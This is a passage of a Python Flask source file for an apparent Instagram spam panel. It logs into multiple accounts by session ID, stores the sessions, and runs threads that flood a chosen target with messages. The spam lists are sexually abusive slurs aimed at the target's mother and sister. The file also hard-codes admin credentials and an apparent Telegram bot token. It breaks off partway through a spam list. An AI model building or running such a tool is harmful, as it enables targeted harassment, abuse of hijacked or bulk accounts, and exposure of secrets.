from flask import Flask, render_template_string, request, redirect, url_for, session, send_file, jsonify, flash
import threading
import os
import json
import random
from itertools import cycle
from instagrapi import Client
import requests
import sqlite3
import time
import re
import urllib.parse
import secrets
from datetime import datetime
from werkzeug.security import generate_password_hash, check_password_hash
import hashlib

app = Flask(__name__)
app.secret_key = "SNAPPY_KEY_ULTIMATE_SECURE"

# ================= ADMIN CREDENTIALS =================
ADMIN_USERNAME = "snappygod"
ADMIN_PASSWORD = "ANISHHU11"

active_spam_threads = {}
lock_name_threads = {}
live_logs = []
app_start_time = time.time()
account_stats = {}
campaign_info = {}
dynamic_targets = {}
node_quarantine_status = {}

ADMIN_TG_BOT_TOKEN = "8797760883:AAGk050hX-7IK26deFOfR3e0Gu8KtbtqLC0"
ADMIN_TG_CHAT_ID = "7420788495"

# ================= DATABASE =================
def init_db():
    conn = sqlite3.connect('panel_users.db')
    cursor = conn.cursor()
    
    # Users table for login
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE,
            password TEXT,
            is_admin INTEGER DEFAULT 0,
            created_at TEXT
        )
    ''')
    
    # Sessions table for Instagram accounts
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            username TEXT UNIQUE,
            full_name TEXT,
            followers INTEGER,
            following INTEGER,
            session_id TEXT,
            ip_address TEXT,
            device TEXT,
            added_at TEXT,
            FOREIGN KEY(user_id) REFERENCES users(id)
        )
    ''')
    
    # Check if admin exists
    cursor.execute("SELECT * FROM users WHERE username = ?", (ADMIN_USERNAME,))
    if not cursor.fetchone():
        hashed_pw = generate_password_hash(ADMIN_PASSWORD)
        cursor.execute("INSERT INTO users (username, password, is_admin, created_at) VALUES (?, ?, ?, ?)",
                      (ADMIN_USERNAME, hashed_pw, 1, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    
    conn.commit()
    conn.close()

init_db()

# ================= SESSION HELPER =================
def get_session_file(username):
    os.makedirs("sessions", exist_ok=True)
    return f"sessions/{username}.pkl"

def login_with_session(session_id, username):
    cl = Client()
    session_file = get_session_file(username)
    
    if os.path.exists(session_file):
        try:
            with open(session_file, 'rb') as f:
                cl.load_settings(f.read())
            cl.login(username, "")
            print(f"✅ [{username}] Session loaded from file!")
            return cl
        except Exception as e:
            print(f"⚠️ [{username}] Saved session failed: {e}")
    
    try:
        sid = session_id.strip()
        if '%3A' in sid:
            sid = urllib.parse.unquote(sid)
        
        try:
            cl.login_by_sessionid(sid)
            print(f"✅ [{username}] Logged in with session ID!")
            with open(session_file, 'wb') as f:
                f.write(cl.get_settings())
            return cl
        except Exception as e1:
            print(f"⚠️ Session ID login failed: {e1}")
            try:
                cl.set_user_agent("Instagram 269.0.0.18.96 Android")
                cl.login_by_sessionid(sid)
                with open(session_file, 'wb') as f:
                    f.write(cl.get_settings())
                return cl
            except Exception as e2:
                print(f"⚠️ Cookie login failed: {e2}")
                raise Exception(f"Session login failed: {e2}")
    except Exception as e:
        print(f"❌ [{username}] Login failed: {e}")
        raise e

def refresh_session(cl, username):
    try:
        if cl is None:
            return None
        try:
            cl.get_user_id(cl.username)
            return cl
        except:
            session_file = get_session_file(username)
            if os.path.exists(session_file):
                try:
                    with open(session_file, 'rb') as f:
                        cl.load_settings(f.read())
                    cl.login(username, "")
                    print(f"🔄 [{username}] Session refreshed!")
                    return cl
                except Exception as e:
                    print(f"❌ [{username}] Refresh failed: {e}")
                    return None
            else:
                print(f"❌ [{username}] No saved session file")
                return None
    except Exception as e:
        print(f"⚠️ Session refresh error: {e}")
        return None

# ================= SPAM LISTS =================
SIREN_LIST_1 = [
    "𝗔𝗡𝗧𝗘𝗥 𝗠𝗔𝗡𝗧𝗘𝗥 𝗦𝗛𝗘𝗧𝗔𝗡𝗜 𝗞𝗛𝗢𝗣𝗗𝗔 < {target}> 𝗧𝗘𝗥𝗜 𝗠𝗔𝗔 𝗞𝗔 𝗕𝗛𝗢𝗦𝗗𝗔 🪼⋆｡𖦹°🫧⋆.ೃ࿔*:･",
    "𝗠𝗔𝗜 𝗣𝗜𝗧𝗔 𝗛𝗨𝗡 𝗣𝗔𝗡𝗜 < {target}> 𝗞𝗜 𝗠𝗔𝗔 𝗥𝗔𝗡𝗗𝗜𝗢𝗡 𝗞𝗜 𝗥𝗔𝗡𝗜 ˖°𓇼🌊⋆🐚🫧",
    "< {target} > 𝗢𝗬𝗘 𝗧𝗘𝗥𝗜 𝗥𝗔𝗡𝗗𝗜 𝗠𝗔𝗔 𝗞𝗢 𝗛𝗔𝗞𝗟𝗔 𝗞𝗘 𝗖𝗛𝗢𝗗𝗨 ‧₊˚🖇️✩ ₊˚🎧⊹♡",
    "𝗔𝗖𝗛𝗔 𝗦𝗨𝗡 𝗧𝗢 < {target}> 𝗧𝗘𝗥𝗜 𝗠𝗔𝗔 𝗞𝗢 𝗕𝗛𝗔𝗚𝗔 𝗕𝗛𝗔𝗚𝗔 𝗖𝗛𝗢𝗗𝗨 ‧₊˚ ☁️⋅♡🪐༘⋆",
    "< {target} > 𝗧𝗘𝗥𝗜 𝗕𝗛𝗘𝗡 𝗞𝗜 𝗧𝗔𝗡𝗚 𝗨𝗧𝗛𝗔 𝗞𝗘 𝗜𝗗𝗛𝗘𝗥 𝗨𝗗𝗛𝗘𝗥 𝗖𝗛𝗢𝗗𝗨𝗡𝗚𝗔 ༘⋆🌷🫧💭₊˚ෆ",
    "< {target} > -----𝗞𝗨𝗧𝗧𝗜𝗬𝗔 𝗕𝗔𝗡𝗔 𝗞𝗜 𝗖𝗢𝗗𝗨 𝗧𝗘𝗥𝗜 𝗠𝗔𝗔 𝗞𝗢 🧉❀🐚🐉︎ ࿔*:･ﾟ☾"
]

SIREN_LIST_2 = [
    "< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??"
]

SIREN_LIST_3 = [
    "( {target} )-----------𝑷𝑹 𝑻𝑬𝑹𝑰 𝑴𝑨𝑨 𝑪𝑯𝑼𝑫𝑵𝑬 𝑲𝑰𝑼 𝑳𝑨𝑮 𝑮𝑨𝑰 <🙄🔥>★⁜⁕↬↬⁜₰⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁🎀🎧( {target} )-----------𝑷𝑹 𝑻𝑬𝑹𝑰 𝑴𝑨𝑨 𝑪𝑯𝑼𝑫𝑵𝑬 𝑲𝑰𝑼 𝑳𝑨𝑮 𝑮𝑨𝑰 <🙄🔥>"
]

SIREN_LIST_4 = [
    "𝑨𝒏𝒕𝒔 𝑰𝒏 𝒀𝒐𝒖𝒓 𝑨𝒔𝒔🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧
